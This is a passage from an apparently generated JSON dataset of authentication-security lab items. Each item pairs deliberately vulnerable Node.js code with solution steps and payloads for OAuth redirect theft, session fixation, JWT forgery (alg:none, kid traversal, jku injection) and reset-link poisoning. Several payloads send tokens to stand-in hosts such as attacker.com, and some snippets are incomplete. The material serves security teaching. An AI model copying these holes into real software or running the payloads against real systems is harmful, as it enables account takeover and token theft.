    "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst oauthConfig = {\n  clientId: 'labClient',\n  clientSecret: 'secret123',\n  authServer: 'http://auth-server/oauth'\n};\n\napp.get('/oauth/callback', (req, res) => {\n  const { code, state } = req.query;\n  const redirectUri = req.cookies.redirect_uri || '/profile';\n  \n  axios.post(`${oauthConfig.authServer}/token`, {\n    code,\n    client_id: oauthConfig.clientId,\n    client_secret: oauthConfig.clientSecret,\n    redirect_uri: redirectUri,\n    grant_type: 'authorization_code'\n  }).then(response => {\n    res.redirect(`${redirectUri}?token=${response.data.access_token}`);\n  }).catch(err => {\n    res.status(500).send('OAuth error');\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "http://vulnerable-app/oauth/authorize?response_type=code&client_id=labClient&redirect_uri=http://attacker.com/callback&scope=profile",
      "http://vulnerable-app/oauth/authorize?response_type=token&client_id=labClient&redirect_uri=http://attacker.com/callback&scope=email",
      "http://vulnerable-app/oauth/authorize?response_type=code&client_id=labClient&redirect_uri=http://vulnerable-app/oauth/callback?next=http://attacker.com&scope=all"
    ]
  },
  {
    "Lab scenario": "Session fixation in SOAP API authentication",
    "Lab Description": "This lab's SOAP-based authentication system is vulnerable to session fixation attacks. The application assigns session tokens before authentication and doesn't regenerate them after login. To solve: fixate a session token on victim's browser and hijack their authenticated session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the initial SOAP request to /ws-auth using Burp Suite and note the Set-Cookie header",
      "Craft a malicious link containing your session token and trick the victim to visit it",
      "Monitor active sessions using OWASP ZAP while victim authenticates",
      "Reuse the fixated session token in authenticated SOAP requests",
      "Access privileged endpoints using the hijacked session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst soap = require('soap');\nconst app = express();\n\nlet sessions = {};\n\napp.use('/ws-auth', (req, res) => {\n  const wsdl = `<?xml version=\"1.0\"?>\n<definitions>\n  <message name=\"authRequest\">\n    <part name=\"username\" type=\"xsd:string\"/>\n    <part name=\"password\" type=\"xsd:string\"/>\n  </message>\n</definitions>`;\n  \n  const service = {\n    AuthService: {\n      AuthPort: {\n        authenticate: (args) => {\n          const session = req.headers.cookie?.split('=')[1] || Math.random().toString(36).substring(2);\n          sessions[session] = { user: args.username };\n          return { sessionToken: session };\n        }\n      }\n    }\n  };\n  \n  soap.listen(app, '/ws-auth', service, wsdl);\n});\n\napp.listen(3000);",
    "payloads": [
      "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:auth=\"http://services.auth.com/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <auth:authenticate>\n         <username>victim</username>\n         <password>password123</password>\n      </auth:authenticate>\n   </soapenv:Body>\n</soapenv:Envelope>",
      "Cookie: sessionid=attacker-fixated-token"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in microservice architecture",
    "Lab Description": "This lab's JWT verification microservice is vulnerable to key path traversal through the kid header parameter. The application uses the kid value to load verification keys without proper sanitization. To solve: craft a JWT token that forces the server to use a predictable public key file.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid JWT token using Burp Suite and analyze its structure",
      "Identify the kid header parameter pointing to key storage location",
      "Craft a malicious kid value with directory traversal (../../known/key.pub)",
      "Sign a new token with a predictable RSA private key matching the forced public key path",
      "Use the forged token to access admin API endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\napp.post('/verify', (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, { complete: true });\n  \n  if (!decoded?.header?.kid) {\n    return res.status(401).json({ error: 'Invalid token' });\n  }\n  \n  try {\n    const key = fs.readFileSync(`/keys/${decoded.header.kid}`);\n    const verified = jwt.verify(token, key);\n    res.json({ access: verified.role === 'admin' ? 'granted' : 'denied' });\n  } catch (err) {\n    res.status(401).json({ error: 'Verification failed' });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uL2V0Yy9zc2gvc3NoX2hvc3RfcnNhX3B1Yl9rZXkifQ.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uL2tleXMvZGVmYXVsdC5wdWIifQ.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage through verbose error messages",
    "Lab Description": "This lab's OAuth implementation leaks sensitive information through verbose error messages. The application reveals access tokens in stack traces during failed token validation. To solve: trigger error conditions to extract valid tokens from other users.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept OAuth token validation requests using Burp Suite",
      "Modify token parameters to trigger validation errors",
      "Analyze error responses for leaked token information",
      "Extract valid tokens from verbose error messages",
      "Reuse stolen tokens to access victim resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\nconst tokens = {\n  'valid-token-123': { user: 'admin', scope: ['read', 'write'] },\n  'expired-token-456': { user: 'user1', scope: ['read'] }\n};\n\napp.post('/oauth/validate', (req, res) => {\n  try {\n    const { token } = req.body;\n    if (!token) throw new Error('Token missing');\n    \n    const tokenData = tokens[token];\n    if (!tokenData) throw new Error(`Invalid token: ${token} not found`);\n    \n    res.json({ valid: true, user: tokenData.user });\n  } catch (err) {\n    console.error(err.stack);\n    res.status(500).json({ \n      error: err.message,\n      stack: process.env.DEBUG ? err.stack : undefined,\n      validTokens: process.env.DEBUG ? Object.keys(tokens) : undefined\n    });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "{\"token\":\"invalid'\"}",
      "{\"token\":{\"$gt\":\"\"}}",
      "{\"token\":null}"
    ]
  },
  {
    "Lab scenario": "JWT role escalation via unsigned key confusion",
    "Lab Description": "This lab's JWT implementation fails to verify the signing algorithm when processing tokens. The application accepts unsigned tokens when expecting RS256-signed ones. To solve: craft a token with admin privileges by exploiting algorithm confusion.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid JWT using Burp Suite and decode it to analyze structure",
      "Extract the public key from the /jwks.json endpoint using Postman",
      "Convert the public key to PEM format using openssl",
      "Craft a new token with alg: HS256 and sign it with the extracted public key",
      "Replace your token with the forged one to gain admin access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\nconst publicKey = fs.readFileSync('./public.key');\n\napp.post('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] });\n    if (decoded.role === 'admin') {\n      res.send('Admin access granted');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.SIGNATURE",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEyMzQ1Njc4OSJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage through state parameter reflection",
    "Lab Description": "This lab's OAuth flow reflects the state parameter in the URL fragment after redirection. The application fails to validate that the returned state matches the original. To solve: intercept the OAuth flow and modify the state to leak the access token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate OAuth flow while intercepting with Burp Suite",
      "Capture the authorization request and note the state parameter",
      "Modify the redirect_uri to point to an attacker-controlled domain",
      "Craft a malicious state parameter containing XSS payload",
      "Capture the token when victim visits the poisoned URL"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\nconst clients = {\n  'client123': { secret: 'sec789', redirectUris: ['https://client.com/callback'] }\n};\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri, state } = req.query;\n  \n  if (!clients[client_id]) {\n    return res.status(400).send('Invalid client');\n  }\n  \n  const token = 'leaked-token-' + Math.random().toString(36).substring(2);\n  res.redirect(`${redirect_uri}#access_token=${token}&state=${state}`);\n});\n\napp.listen(3000);",
    "payloads": [
      "https://oauth-provider/oauth/authorize?client_id=client123&redirect_uri=https://attacker.com&state=<script>alert(1)</script>",
      "https://oauth-provider/oauth/authorize?client_id=client123&redirect_uri=https://attacker.com&state=malicious-payload"
    ]
  },
  {
    "Lab scenario": "Session fixation through GraphQL WebSocket connection",
    "Lab Description": "This lab's GraphQL subscription endpoint assigns session tokens over WebSocket before authentication. The application fails to regenerate tokens after login. To solve: establish a WebSocket connection to fixate a session token, then authenticate to hijack the session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish WebSocket connection to /graphql using OWASP ZAP",
      "Note the session token in the connection initialization response",
      "Fixate the token by setting it in a victim's browser",
      "Monitor active subscriptions while victim authenticates",
      "Reuse the WebSocket connection with the fixated token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst { createServer } = require('http');\nconst { SubscriptionServer } = require('subscriptions-transport-ws');\nconst { execute, subscribe } = require('graphql');\n\nconst app = express();\nconst server = createServer(app);\n\nserver.listen(4000, () => {\n  new SubscriptionServer({\n    execute,\n    subscribe,\n    onConnect: (connectionParams, webSocket) => {\n      const sessionToken = Math.random().toString(36).substring(2);\n      webSocket.sessionToken = sessionToken;\n      return { sessionToken };\n    }\n  }, {\n    server,\n    path: '/graphql'\n  });\n});",
    "payloads": [
      "{\"type\":\"connection_init\",\"payload\":{}}",
      "{\"id\":\"1\",\"type\":\"start\",\"payload\":{\"query\":\"subscription { authEvents { token } }\"}}"
    ]
  },
  {
    "Lab scenario": "JWT claim injection via nested JSON objects",
    "Lab Description": "This lab's JWT processing incorrectly handles nested JSON objects in claims. The application fails to properly validate claim structures when verifying tokens. To solve: inject a nested 'admin' claim to escalate privileges.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid JWT token using Burp Suite and decode it",
      "Identify the claims structure vulnerable to nested object injection",
      "Craft a new token with malicious nested claims using jwt_tool",
      "Test different nesting structures to bypass validation",
      "Verify admin access by accessing protected endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst secret = 'supersecret';\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, secret);\n    if (decoded.role === 'admin' || decoded.claims?.role === 'admin') {\n      res.send('Admin portal accessed');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImNsYWltcyI6eyJyb2xlIjoiYWRtaW4ifX0.SIGNATURE",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImF0dHJzIjp7InJvbGUiOiJhZG1pbiJ9fQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping through parameter pollution",
    "Lab Description": "This lab's OAuth implementation is vulnerable to HTTP parameter pollution during token exchange. The application processes multiple token parameters inconsistently. To solve: inject a second token parameter to swap privileges.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the OAuth token exchange flow using Burp Suite",
      "Identify where the token parameter is processed",
      "Add a duplicate token parameter with different values",
      "Test different parameter positions (query vs body)",
      "Capture the elevated access token in the response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\nconst tokens = {\n  'user_token': { scope: 'read' },\n  'admin_token': { scope: 'read write admin' }\n};\n\napp.post('/oauth/token', (req, res) => {\n  const token = req.body.token || req.query.token;\n  if (Array.isArray(token)) {\n    return res.json(tokens[token[1]]);\n  }\n  res.json(tokens[token]);\n});\n\napp.listen(3000);",
    "payloads": [
      "POST /oauth/token?token=user_token&token=admin_token",
      "token=user_token&token=admin_token"
    ]
  },
  {
    "Lab scenario": "Session token leakage through GraphQL batch requests",
    "Lab Description": "This lab's GraphQL endpoint processes batch requests sequentially while maintaining session state. The application leaks session tokens between requests in a batch. To solve: craft a batch query that leaks another user's session token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify the GraphQL batch endpoint using Postman",
      "Craft a batch request with session operations",
      "Include a session token extraction query in the batch",
      "Analyze response for leaked tokens",
      "Reuse captured tokens for session hijacking"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\n\nconst schema = buildSchema(`\n  type Query {\n    getSession: String\n    setSession(token: String): String\n  }\n`);\n\nconst root = {\n  getSession: () => currentToken,\n  setSession: ({token}) => currentToken = token\n};\n\nlet currentToken = '';\nconst app = express();\n\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  batch: true\n}));\n\napp.listen(4000);",
    "payloads": [
      "[{\"query\":\"mutation { setSession(token: \\\"victim_token\\\") }\",\"variables\":{}},{\"query\":\"{ getSession }\",\"variables\":{}}]",
      "[{\"query\":\"mutation($tok: String!) { setSession(token: $tok) }\",\"variables\":{\"tok\":\"victim_token\"}},{\"query\":\"{ getSession }\"}]"
    ]
  },
  {
    "Lab scenario": "JWT header parameter injection via URI fragments",
    "Lab Description": "This lab's JWT implementation incorrectly processes URI fragments in the kid header parameter. The application fetches verification keys from untrusted locations when special characters are used. To solve: inject a malicious key URI to forge admin tokens.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite and analyze the header",
      "Identify the kid parameter pointing to key location",
      "Craft a token with kid containing URI fragment (#attacker.com/key.json)",
      "Host a malicious public key at the specified location",
      "Use the forged token to access admin endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\n\napp.post('/verify', async (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, { complete: true });\n  \n  if (!decoded?.header?.kid) {\n    return res.status(401).json({ error: 'Invalid token' });\n  }\n  \n  try {\n    const key = await axios.get(`https://keyserver/${decoded.header.kid}`);\n    const verified = jwt.verify(token, key.data);\n    res.json({ access: verified.role === 'admin' ? 'granted' : 'denied' });\n  } catch (err) {\n    res.status(401).json({ error: 'Verification failed' });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImRlZmF1bHQucHViI2F0dGFja2VyLmNvbS9tYWxpY2lvdXMua2V5In0.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9wYXRoL3RvL2tleSNhdHRhY2tlci5jb20va2V5In0.eyJyb2xlIjoiYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token theft via iframe timing attack",
    "Lab Description": "This lab's OAuth implementation leaks token validity through iframe response times. The application processes valid tokens slower due to database lookups. To solve: measure iframe load times to brute-force active tokens.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify OAuth-protected iframe endpoints using OWASP ZAP",
      "Create a malicious page with multiple hidden iframes",
      "Measure response times for different token values",
      "Analyze timing differences to identify valid tokens",
      "Hijack the session using the identified token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\nconst validTokens = new Set(['secret123', 'admin456']);\n\napp.get('/iframe', (req, res) => {\n  const token = req.query.token;\n  \n  if (validTokens.has(token)) {\n    setTimeout(() => {\n      res.send('Protected content');\n    }, 500); \n  } else {\n    res.send('Invalid token');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "<iframe src=\"https://oauth-provider/iframe?token=brute1\" onload=\"timing1=performance.now()\">",
      "<iframe src=\"https://oauth-provider/iframe?token=brute2\" onload=\"timing2=performance.now()\">"
    ]
  },
  {
    "Lab scenario": "Session fixation through WebSocket subprotocol negotiation",
    "Lab Description": "This lab's WebSocket implementation assigns sessions during subprotocol negotiation. The application fails to regenerate session tokens after authentication. To solve: fixate a session during WS handshake then authenticate to hijack.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebSocket connections using Burp Suite",
      "Modify Sec-WebSocket-Protocol header to inject session",
      "Establish connection with fixated session token",
      "Monitor active sessions while victim authenticates",
      "Reuse the WebSocket connection with hijacked session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({ port: 8080 });\n\nwss.on('connection', (ws, req) => {\n  const protocol = req.headers['sec-websocket-protocol'];\n  ws.sessionToken = protocol || Math.random().toString(36).substring(2);\n  \n  ws.on('message', (message) => {\n    if (message === 'AUTH') {\n      ws.authenticated = true;\n    }\n  });\n});",
    "payloads": [
      "Sec-WebSocket-Protocol: fixated-session-token",
      "GET /chat HTTP/1.1\r\nHost: server.example.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Protocol: attacker-token\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "REST API JWT role escalation via unverified header injection",
    "Lab Description": "The REST API endpoint validates JWT tokens but fails to verify custom headers. The application blindly trusts X-Role headers when present. To solve: craft a request combining a low-privilege JWT with a malicious X-Role header to gain admin access.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept normal user API request with Burp Suite",
      "Add X-Role: admin header to the request",
      "Modify JWT to extend expiration time",
      "Verify role change in API response",
      "Access admin-only endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/api/admin', (req, res) => {const token = req.headers.authorization?.split(' ')[1];const role = req.headers['x-role'] || jwt.verify(token,'secret').role;if(role === 'admin') return res.send('Admin data');res.status(403).send('Forbidden');});app.listen(3000);",
    "payloads": [
      "GET /api/admin HTTP/1.1\nX-Role: admin",
      "GET /api/admin HTTP/1.1\nX-Role: superuser"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via state parameter reflection",
    "Lab Description": "The OAuth implementation reflects the state parameter without validation in the redirect URL. The application fails to maintain server-side state. To solve: intercept the OAuth flow and modify the state parameter to hijack another user's session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth flow with attacker account",
      "Intercept callback using OWASP ZAP",
      "Modify state parameter to victim's session ID",
      "Complete flow with stolen token",
      "Access victim's resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const {code,state} = req.query;res.cookie('session',state);res.redirect(`/?token=${code}`);});app.listen(3000);",
    "payloads": [
      "https://vulnerable.com/oauth/callback?code=ABC123&state=attacker_session",
      "https://vulnerable.com/oauth/callback?code=XYZ789&state=victim_session"
    ]
  },
  {
    "Lab scenario": "GraphQL batched query authentication bypass",
    "Lab Description": "The GraphQL endpoint processes batched queries sequentially without proper authorization checks between operations. The application fails to validate query interdependencies. To solve: craft a batched query that combines an authentication mutation with a privileged query.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify GraphQL endpoint using Postman",
      "Construct batched query with auth mutation",
      "Chain privileged query in same batch",
      "Execute combined operation",
      "Extract sensitive data from response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {graphqlHTTP} = require('express-graphql');const {buildSchema} = require('graphql');const schema = buildSchema(`type Query {secretData:String} type Mutation {login(username:String,password:String):String}`);const root = {secretData:()=>'Confidential',login:(args)=>args.username==='admin'&&args.password==='admin'?'valid':'invalid'};app.use('/graphql',graphqlHTTP({schema,rootValue:root}));",
    "payloads": [
      "[{\"query\":\"mutation{login(username:\\\"admin\\\",password:\\\"admin\\\")}\"},{\"query\":\"{secretData}\"}]",
      "[{\"query\":\"mutation{login(username:\\\"any\\\",password:\\\"any\\\")}\"},{\"query\":\"{secretData}\"}]"
    ]
  },
  {
    "Lab scenario": "Session fixation via JSONP callback parameter",
    "Lab Description": "The application sets session cookies through a JSONP endpoint that reflects callback parameters. The vulnerable implementation allows session fixation attacks. To solve: craft a malicious page that fixes a session ID for the victim then triggers authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify JSONP session endpoint",
      "Craft malicious HTML page with fixed session",
      "Lure victim to visit the page",
      "Wait for victim to authenticate",
      "Use fixed session to access account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/session.jsonp', (req, res) => {const callback = req.query.callback||'callback';res.send(`${callback}({session:'${req.query.sid||Math.random()}'})`);});app.listen(3000);",
    "payloads": [
      "<script src=\"https://vulnerable.com/session.jsonp?callback=fixSession&sid=malicious123\"></script>",
      "<script src=\"https://vulnerable.com/session.jsonp?sid=attacker_controlled\"></script>"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jku header injection",
    "Lab Description": "The JWT verification accepts arbitrary jku (JWK Set URL) headers without validation. The application fails to whitelist trusted key servers. To solve: host a malicious JWK Set and craft a token signed with your own key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Generate RSA key pair using OpenSSL",
      "Host malicious JWK Set JSON file",
      "Craft JWT with jku pointing to your server",
      "Sign token with your private key",
      "Submit to protected endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const jwksClient = require('jwks-rsa');const app = express();app.get('/protected', (req, res) => {const token = req.headers.authorization?.split(' ')[1];const decoded = jwt.decode(token,{complete:true});const client = jwksClient({jwksUri:decoded?.header?.jku});client.getSigningKey(decoded.header.kid,(err,key)=>{if(err) return res.status(403).send('Invalid token');jwt.verify(token,key.getPublicKey(),(err,payload)=>{if(err) return res.status(403).send('Invalid token');res.send('Protected data');});});});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2tleXMuanNvbiIsImtpZCI6Im1hbGljaW91cyJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.fake_signature",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vZXZpbC5jb20vandrcyIsImtpZCI6IjEyMzQ1In0.eyJyb2xlIjoiYWRtaW4ifQ.fake_sig"
    ]
  },
  {
    "Lab scenario": "Password reset poisoning via X-Forwarded-Host header",
    "Lab Description": "The password reset functionality uses the Host header to generate reset links without proper validation. The application trusts X-Forwarded-Host headers. To solve: poison the reset link generation to send tokens to an attacker-controlled domain.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept password reset request with Burp",
      "Add X-Forwarded-Host: attacker.com header",
      "Trigger reset for victim account",
      "Capture token from your server logs",
      "Complete password reset"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/reset-password', (req, res) => {const host = req.headers['x-forwarded-host']||req.headers.host;const token = generateToken();res.send(`Reset link: https://${host}/reset?token=${token}`);});app.listen(3000);",
    "payloads": [
      "POST /reset-password HTTP/1.1\nX-Forwarded-Host: attacker.com",
      "POST /reset-password HTTP/1.1\nHost: vulnerable.com\nX-Forwarded-Host: evil.net"
    ]
  },
  {
    "Lab scenario": "MFA bypass via race condition in verification state",
    "Lab Description": "The multi-factor authentication flow has a race condition between verification and session state update. The application uses eventual consistency for MFA status. To solve: send parallel requests to bypass MFA before state propagation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate MFA verification in browser",
      "Intercept both verification and session requests",
      "Send verification and session requests in parallel",
      "Repeat until session grants access",
      "Access protected resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();let mfaVerified = {};app.post('/verify-mfa', (req, res) => {mfaVerified[req.body.session] = true;res.send('Verified');});app.get('/session', (req, res) => {setTimeout(()=>{if(mfaVerified[req.query.id]) res.send('Access granted');else res.status(403).send('MFA required');},100);});app.listen(3000);",
    "payloads": [
      "POST /verify-mfa HTTP/1.1\nContent-Type: application/json\n\n{\"session\":\"victim123\"}",
      "GET /session?id=victim123 HTTP/1.1"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via case-insensitive password comparison",
    "Lab Description": "The login endpoint performs case-insensitive password comparison. The application fails to normalize input before hashing. To solve: exploit the case-insensitive check to reduce password entropy for brute-forcing.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify case-insensitive behavior with Postman",
      "Generate case variations of common passwords",
      "Configure Burp Intruder with case variants",
      "Execute credential stuffing attack",
      "Identify successful logins"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = [{username:'admin',password:'Secret123'}];app.post('/login', (req, res) => {const user = users.find(u=>u.username===req.body.username&&u.password.toLowerCase()===req.body.password.toLowerCase());if(user) res.send('Logged in');else res.status(401).send('Invalid credentials');});app.listen(3000);",
    "payloads": [
      "{\"username\":\"admin\",\"password\":\"secret123\"}",
      "{\"username\":\"admin\",\"password\":\"SECRET123\"}",
      "{\"username\":\"admin\",\"password\":\"SeCrEt123\"}"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in Node.js authentication middleware",
    "Lab Description": "The lab's JWT authentication implementation accepts unsigned tokens when alg:none is specified. The application fails to validate token signatures properly. To solve: forge a valid admin token by exploiting the alg:none vulnerability.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite",
      "Decode the token in JWT Editor to analyze structure",
      "Modify the alg header to 'none' and remove signature",
      "Change the role claim to 'admin'",
      "Submit the modified token to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization.split(' ')[1];const decoded = jwt.decode(token, {complete: true});if (decoded.header.alg === 'none') {const payload = decoded.payload;if (payload.role === 'admin') return res.send('Admin access granted');}res.status(403).send('Access denied');});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via open redirect in callback endpoint",
    "Lab Description": "The OAuth implementation leaks access tokens through an unvalidated redirect parameter in the callback endpoint. The application fails to check redirect URLs against a whitelist. To solve: steal the OAuth token by forcing it to be sent to an attacker-controlled domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify the OAuth callback URL parameter using OWASP ZAP",
      "Craft a malicious redirect URL to attacker.com",
      "Initiate OAuth flow with modified redirect_uri",
      "Intercept the callback containing the access token",
      "Use the token to authenticate as victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const {code, state, redirect_uri} = req.query;const token = generateAccessToken(code);res.redirect(`${redirect_uri}?token=${token}`);});function generateAccessToken(code) {return 'secret_token_'+code;}app.listen(3000);",
    "payloads": [
      "https://vulnerable.com/oauth/callback?code=123&redirect_uri=https://attacker.com",
      "https://vulnerable.com/oauth/callback?code=456&redirect_uri=http://evil.com"
    ]
  },
  {
    "Lab scenario": "Session fixation via unprotected session regeneration",
    "Lab Description": "The application assigns session IDs before authentication and doesn't regenerate them after login. The vulnerable behavior allows session fixation attacks. To solve: fixate a session ID on victim's browser then wait for them to authenticate.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Obtain a valid session cookie from application",
      "Set victim's cookie using XSS or MITM",
      "Wait for victim to authenticate",
      "Access account using the pre-set session ID",
      "Verify privileged access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const session = require('express-session');const app = express();app.use(session({secret:'weaksecret',resave:false,saveUninitialized:true}));app.post('/login', (req, res) => {req.session.user = req.body.username;res.send('Logged in');});app.get('/admin', (req, res) => {if (req.session.user === 'admin') res.send('Admin panel');else res.status(403).send('Forbidden');});app.listen(3000);",
    "payloads": [
      "sessionid=malicious123",
      "connect.sid=s%3Aevil.session"
    ]
  },
  {
    "Lab scenario": "GraphQL introspection leads to unauthorized data access",
    "Lab Description": "The GraphQL endpoint has introspection enabled, exposing sensitive schema information. The application doesn't implement proper authorization checks. To solve: extract hidden mutations through introspection then execute privileged operations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send introspection query using Postman",
      "Analyze schema for hidden mutations",
      "Craft mutation to elevate privileges",
      "Execute mutation with stolen token",
      "Verify admin access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {buildSchema} = require('graphql');const schema = buildSchema(`type Query {hiddenMutation: String}`);const root = {hiddenMutation: () => 'Sensitive data exposed'};app.use('/graphql', graphqlHTTP({schema,rootValue:root,graphiql:true}));",
    "payloads": [
      "{\"query\":\"query {__schema {types {name fields {name}}}}\"}",
      "{\"query\":\"mutation {hiddenMutation}\"}"
    ]
  },
  {
